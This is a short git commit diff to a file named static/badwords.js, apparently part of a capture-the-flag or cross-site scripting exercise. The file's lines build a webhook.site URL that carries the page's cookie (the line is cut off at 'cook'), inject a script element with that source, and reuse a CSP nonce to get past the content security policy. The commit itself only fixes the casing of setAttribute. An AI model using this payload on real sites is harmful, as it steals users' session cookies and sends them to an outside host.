7cc5fcb6681cb265c01364ef877a6eaf3258cd46
SovietBeast <44019881+SovietBeast@users.noreply.github.com>
2021-05-15 16:26:26 +0200

    Update badwords.js

--- static/badwords.js
+++ static/badwords.js
@@ -4,5 +4,5 @@ var src = 'https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?=' + cook
 var s = document.createElement('script')
 s.type = "text/javascipt"
 s.src = src
-s.SetAttribute('nonce', nounce)
+s.setAttribute('nonce', nounce)
 document.body.appendChild(s)
